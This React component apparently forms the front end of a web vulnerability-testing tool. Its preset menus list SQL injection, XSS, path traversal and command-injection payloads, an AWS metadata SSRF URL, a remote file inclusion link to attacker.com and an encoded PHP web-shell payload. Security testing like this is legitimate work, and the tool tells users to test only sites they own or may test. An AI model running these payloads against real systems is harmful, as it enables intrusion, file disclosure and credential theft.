import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { 
  AlertTriangle, 
  Code, 
  Database, 
  Folder, 
  File, 
  Terminal, 
  Globe, 
  RefreshCw, 
  Lock, 
  Key, 
  ShieldAlert, 
  Server
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { Scan } from "@shared/schema";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { apiRequest } from "@/lib/queryClient";

interface AttackSimulatorProps {
  url: string;
  scan: Scan;
}

// Form schema for attack parameters
const attackParamsSchema = z.object({
  target: z.string().min(1, "Target is required"),
  method: z.string().optional(),
  parameter: z.string().optional(),
  payload: z.string().optional(),
  options: z.string().optional(),
});

type AttackParams = z.infer<typeof attackParamsSchema>;

export default function AttackSimulator({ url, scan }: AttackSimulatorProps) {
  const [activeAttack, setActiveAttack] = useState("sql-injection");
  const [attackResults, setAttackResults] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();
  
  const form = useForm<AttackParams>({
    resolver: zodResolver(attackParamsSchema),
    defaultValues: {
      target: url,
      method: "GET",
      parameter: "",
      payload: "",
      options: "",
    },
  });

  const performAttack = async (data: AttackParams) => {
    setIsLoading(true);
    setAttackResults(null);
    
    try {
      // Customize request based on attack type
      const payload = {
        attackType: activeAttack,
        ...data
      };
      
      const response = await apiRequest("POST", "/api/attack", payload);
      const result = await response.json();
      
      // Display results
      setAttackResults(result.results);
      
      toast({
        title: "Attack simulation completed",
        description: "The attack simulation has completed successfully.",
      });
    } catch (error) {
      toast({
        title: "Attack simulation failed",
        description: error instanceof Error ? error.message : "An unknown error occurred",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };
  
  // Helper to get attack-specific form fields
  const getAttackSpecificFields = () => {
    switch (activeAttack) {
      case "sql-injection":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Parameter to test</FormLabel>
                  <FormControl>
                    <Input placeholder="id, user, search, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>SQL Injection payload</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select a payload" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="' OR '1'='1">Basic: ' OR '1'='1</SelectItem>
                        <SelectItem value="' OR 1=1--">Comment: ' OR 1=1--</SelectItem>
                        <SelectItem value="' UNION SELECT 1,2,3--">UNION: ' UNION SELECT 1,2,3--</SelectItem>
                        <SelectItem value="admin' --">Auth bypass: admin' --</SelectItem>
                        <SelectItem value="custom">Custom payload</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            {form.watch("payload") === "custom" && (
              <FormField
                control={form.control}
                name="options"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Custom payload</FormLabel>
                    <FormControl>
                      <Textarea placeholder="Enter your custom SQL injection payload" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}
          </>
        );
      
      case "xss":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Parameter to test</FormLabel>
                  <FormControl>
                    <Input placeholder="search, q, name, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>XSS payload</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select a payload" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="<script>alert(1)</script>">Basic: &lt;script&gt;alert(1)&lt;/script&gt;</SelectItem>
                        <SelectItem value="<img src=x onerror=alert(1)>">IMG: &lt;img src=x onerror=alert(1)&gt;</SelectItem>
                        <SelectItem value="<svg onload=alert(1)>">SVG: &lt;svg onload=alert(1)&gt;</SelectItem>
                        <SelectItem value="javascript:alert(1)">JavaScript URI: javascript:alert(1)</SelectItem>
                        <SelectItem value="custom">Custom payload</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            {form.watch("payload") === "custom" && (
              <FormField
                control={form.control}
                name="options"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Custom payload</FormLabel>
                    <FormControl>
                      <Textarea placeholder="Enter your custom XSS payload" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}
          </>
        );
      
      case "directory-traversal":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Parameter to test</FormLabel>
                  <FormControl>
                    <Input placeholder="page, file, path, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Directory traversal payload</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select a payload" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="../../../etc/passwd">Linux: ../../../etc/passwd</SelectItem>
                        <SelectItem value="..\..\..\..\windows\win.ini">Windows: ..\..\..\..\windows\win.ini</SelectItem>
                        <SelectItem value="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd">URL encoded: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</SelectItem>
                        <SelectItem value="....//....//....//etc/passwd">Filter bypass: ....//....//....//etc/passwd</SelectItem>
                        <SelectItem value="custom">Custom payload</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            {form.watch("payload") === "custom" && (
              <FormField
                control={form.control}
                name="options"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Custom payload</FormLabel>
                    <FormControl>
                      <Textarea placeholder="Enter your custom directory traversal payload" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}
          </>
        );
      
      case "file-inclusion":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Parameter to test</FormLabel>
                  <FormControl>
                    <Input placeholder="include, file, page, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>File inclusion payload</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select a payload" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="../../../etc/passwd">LFI: ../../../etc/passwd</SelectItem>
                        <SelectItem value="http://attacker.com/malicious.php">RFI: http://attacker.com/malicious.php</SelectItem>
                        <SelectItem value="php://filter/convert.base64-encode/resource=config.php">PHP wrapper: php://filter/convert.base64-encode/resource=config.php</SelectItem>
                        <SelectItem value="data://text/plain;base64,PHBocCBzeXN0ZW0oJF9HRVRbY21kXSk7Pz4=">Data wrapper: data://text/plain;base64,PHBocCBzeXN0ZW0...</SelectItem>
                        <SelectItem value="custom">Custom payload</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            {form.watch("payload") === "custom" && (
              <FormField
                control={form.control}
                name="options"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Custom payload</FormLabel>
                    <FormControl>
                      <Textarea placeholder="Enter your custom file inclusion payload" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}
          </>
        );
        
      case "command-injection":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Parameter to test</FormLabel>
                  <FormControl>
                    <Input placeholder="command, exec, ping, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Command injection payload</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select a payload" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="127.0.0.1; cat /etc/passwd">Linux: 127.0.0.1; cat /etc/passwd</SelectItem>
                        <SelectItem value="127.0.0.1 && dir">Windows: 127.0.0.1 && dir</SelectItem>
                        <SelectItem value="127.0.0.1 | whoami">Pipe: 127.0.0.1 | whoami</SelectItem>
                        <SelectItem value="$(cat /etc/passwd)">Command substitution: $(cat /etc/passwd)</SelectItem>
                        <SelectItem value="custom">Custom payload</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            {form.watch("payload") === "custom" && (
              <FormField
                control={form.control}
                name="options"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Custom payload</FormLabel>
                    <FormControl>
                      <Textarea placeholder="Enter your custom command injection payload" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}
          </>
        );
        
      case "ssrf":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Parameter to test</FormLabel>
                  <FormControl>
                    <Input placeholder="url, site, image, proxy, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>SSRF payload</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select a payload" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="http://127.0.0.1:80">Internal web: http://127.0.0.1:80</SelectItem>
                        <SelectItem value="http://169.254.169.254/latest/meta-data/">AWS metadata: http://169.254.169.254/latest/meta-data/</SelectItem>
                        <SelectItem value="http://localhost/admin">Local admin: http://localhost/admin</SelectItem>
                        <SelectItem value="file:///etc/passwd">File protocol: file:///etc/passwd</SelectItem>
                        <SelectItem value="custom">Custom payload</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            {form.watch("payload") === "custom" && (
              <FormField
                control={form.control}
                name="options"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Custom payload</FormLabel>
                    <FormControl>
                      <Textarea placeholder="Enter your custom SSRF payload" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}
          </>
        );
        
      case "csrf":
        return (
          <>
            <FormField
              control={form.control}
              name="method"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>HTTP Method</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select HTTP method" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="GET">GET</SelectItem>
                        <SelectItem value="POST">POST</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>CSRF vulnerable endpoint</FormLabel>
                  <FormControl>
                    <Input placeholder="/change-password, /update-profile, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Form data parameters (JSON)</FormLabel>
                  <FormControl>
                    <Textarea 
                      placeholder='{"newPassword": "hacked123", "confirmPassword": "hacked123"}' 
                      {...field} 
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
          </>
        );
        
      case "session-hijacking":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Session cookie name</FormLabel>
                  <FormControl>
                    <Input placeholder="PHPSESSID, session_id, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Session cookie value (optional)</FormLabel>
                  <FormControl>
                    <Input placeholder="xss7d8s9f7s0df78s" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
          </>
        );
        
      case "brute-force":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Login endpoint</FormLabel>
                  <FormControl>
                    <Input placeholder="/login, /admin, /wp-login.php, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Username to test</FormLabel>
                  <FormControl>
                    <Input placeholder="admin, administrator, root, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="options"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Password list (one per line or comma-separated)</FormLabel>
                  <FormControl>
                    <Textarea 
                      placeholder="password123, admin, 12345, qwerty"
                      {...field} 
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
          </>
        );
        
      case "password-cracking":
        return (
          <>
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Password hash to crack</FormLabel>
                  <FormControl>
                    <Textarea 
                      placeholder="5f4dcc3b5aa765d61d8327deb882cf99"
                      {...field} 
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Hash type</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select hash type" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="md5">MD5</SelectItem>
                        <SelectItem value="sha1">SHA1</SelectItem>
                        <SelectItem value="sha256">SHA256</SelectItem>
                        <SelectItem value="bcrypt">bcrypt</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
          </>
        );
        
      case "privilege-escalation":
        return (
          <>
            <FormField
              control={form.control}
              name="parameter"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>User role to escalate from</FormLabel>
                  <FormControl>
                    <Input placeholder="user, subscriber, editor, etc." {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="payload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Privilege escalation technique</FormLabel>
                  <FormControl>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select technique" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="parameter-manipulation">Parameter manipulation</SelectItem>
                        <SelectItem value="cookie-manipulation">Cookie manipulation</SelectItem>
                        <SelectItem value="horizontal-escalation">Horizontal access control</SelectItem>
                        <SelectItem value="vertical-escalation">Vertical access control</SelectItem>
                        <SelectItem value="custom">Custom technique</SelectItem>
                      </SelectContent>
                    </Select>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            {form.watch("payload") === "custom" && (
              <FormField
                control={form.control}
                name="options"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Custom technique details</FormLabel>
                    <FormControl>
                      <Textarea placeholder="Describe the custom privilege escalation technique" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}
          </>
        );
        
      default:
        return null;
    }
  };
  
  // Get attack icon based on current attack type
  const getAttackIcon = () => {
    switch (activeAttack) {
      case "sql-injection": return <Database className="h-5 w-5 mr-2" />;
      case "xss": return <Code className="h-5 w-5 mr-2" />;
      case "directory-traversal": return <Folder className="h-5 w-5 mr-2" />;
      case "file-inclusion": return <File className="h-5 w-5 mr-2" />;
      case "command-injection": return <Terminal className="h-5 w-5 mr-2" />;
      case "ssrf": return <Globe className="h-5 w-5 mr-2" />;
      case "csrf": return <RefreshCw className="h-5 w-5 mr-2" />;
      case "session-hijacking": return <Lock className="h-5 w-5 mr-2" />;
      case "brute-force": return <Key className="h-5 w-5 mr-2" />;
      case "password-cracking": return <ShieldAlert className="h-5 w-5 mr-2" />;
      case "privilege-escalation": return <Server className="h-5 w-5 mr-2" />;
      default: return <AlertTriangle className="h-5 w-5 mr-2" />;
    }
  };
  
  // Get title and description for attack type
  const getAttackInfo = () => {
    switch (activeAttack) {
      case "sql-injection":
        return {
          title: "SQL Injection",
          description: "Attempt to execute malicious SQL commands on a database through insecure input fields."
        };
      case "xss":
        return {
          title: "Cross-Site Scripting (XSS)",
          description: "Test for XSS vulnerabilities by attempting to inject and execute client-side scripts."
        };
      case "directory-traversal":
        return {
          title: "Directory Traversal",
          description: "Attempt to access files and directories stored outside the web root folder."
        };
      case "file-inclusion":
        return {
          title: "File Inclusion",
          description: "Test for local or remote file inclusion vulnerabilities in web applications."
        };
      case "command-injection":
        return {
          title: "Command Injection",
          description: "Attempt to execute system commands on the host operating system through a vulnerable application."
        };
      case "ssrf":
        return {
          title: "Server-Side Request Forgery (SSRF)",
          description: "Induce the server to make requests to internal resources or external systems."
        };
      case "csrf":
        return {
          title: "Cross-Site Request Forgery (CSRF)",
          description: "Test if the application is vulnerable to CSRF attacks that force authenticated users to execute unwanted actions."
        };
      case "session-hijacking":
        return {
          title: "Session Hijacking",
          description: "Attempt to steal or manipulate user session identifiers to gain unauthorized access."
        };
      case "brute-force":
        return {
          title: "Brute-Force Attacks",
          description: "Test authentication mechanisms against systematic guessing of credentials."
        };
      case "password-cracking":
        return {
          title: "Password Cracking",
          description: "Attempt to recover passwords from captured password hashes."
        };
      case "privilege-escalation":
        return {
          title: "Privilege Escalation",
          description: "Test for vulnerabilities that allow users to gain elevated access to resources."
        };
      default:
        return {
          title: "Unknown Attack",
          description: "No description available."
        };
    }
  };
  
  const attackInfo = getAttackInfo();
  
  return (
    <Card className="mt-6">
      <CardHeader>
        <div className="flex items-center">
          {getAttackIcon()}
          <CardTitle>Attack Simulator</CardTitle>
        </div>
        <CardDescription>
          Simulate various attacks on your own website to test for vulnerabilities.
          Only use these tools on websites you own or have permission to test.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
          <div className="col-span-1 overflow-auto">
            <Tabs
              orientation="vertical"
              value={activeAttack}
              onValueChange={setActiveAttack}
              className="w-full"
            >
              <TabsList className="flex flex-col space-y-1 w-full h-auto bg-transparent">
                <TabsTrigger
                  value="sql-injection"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <Database className="h-4 w-4 mr-2" />
                  SQL Injection
                </TabsTrigger>
                <TabsTrigger
                  value="xss"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <Code className="h-4 w-4 mr-2" />
                  Cross-Site Scripting
                </TabsTrigger>
                <TabsTrigger
                  value="directory-traversal"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <Folder className="h-4 w-4 mr-2" />
                  Directory Traversal
                </TabsTrigger>
                <TabsTrigger
                  value="file-inclusion"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <File className="h-4 w-4 mr-2" />
                  File Inclusion
                </TabsTrigger>
                <TabsTrigger
                  value="command-injection"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <Terminal className="h-4 w-4 mr-2" />
                  Command Injection
                </TabsTrigger>
                <TabsTrigger
                  value="ssrf"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <Globe className="h-4 w-4 mr-2" />
                  SSRF
                </TabsTrigger>
                <TabsTrigger
                  value="csrf"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <RefreshCw className="h-4 w-4 mr-2" />
                  CSRF
                </TabsTrigger>
                <TabsTrigger
                  value="session-hijacking"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <Lock className="h-4 w-4 mr-2" />
                  Session Hijacking
                </TabsTrigger>
                <TabsTrigger
                  value="brute-force"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <Key className="h-4 w-4 mr-2" />
                  Brute-Force
                </TabsTrigger>
                <TabsTrigger
                  value="password-cracking"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <ShieldAlert className="h-4 w-4 mr-2" />
                  Password Cracking
                </TabsTrigger>
                <TabsTrigger
                  value="privilege-escalation"
                  className="justify-start text-left px-3 py-2 h-auto data-[state=active]:bg-neutral-100"
                >
                  <Server className="h-4 w-4 mr-2" />
                  Privilege Escalation
                </TabsTrigger>
              </TabsList>
            </Tabs>
          </div>
          
          <div className="col-span-1 md:col-span-3">
            <div className="bg-neutral-100 p-4 rounded-lg mb-4">
              <h3 className="text-lg font-medium mb-1">{attackInfo.title}</h3>
              <p className="text-sm text-neutral-300">{attackInfo.description}</p>
            </div>
            
            <Form {...form}>
              <form onSubmit={form.handleSubmit(performAttack)} className="space-y-4">
                <FormField
                  control={form.control}
                  name="target"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Target URL</FormLabel>
                      <FormControl>
                        <Input {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                {getAttackSpecificFields()}
                
                <div className="flex justify-end mt-4">
                  <Button 
                    type="submit" 
                    className="bg-primary text-white"
                    disabled={isLoading}
                  >
                    {isLoading ? "Running Attack..." : "Run Attack Simulation"}
                  </Button>
                </div>
              </form>
            </Form>
            
            {attackResults && (
              <div className="mt-6">
                <h3 className="text-lg font-medium mb-2">Attack Results</h3>
                <div className="bg-neutral-100 p-4 rounded-lg font-mono text-sm overflow-x-auto">
                  <pre>{typeof attackResults === 'string' ? attackResults : JSON.stringify(attackResults, null, 2)}</pre>
                </div>
              </div>
            )}
          </div>
        </div>
      </CardContent>
    </Card>
  );
}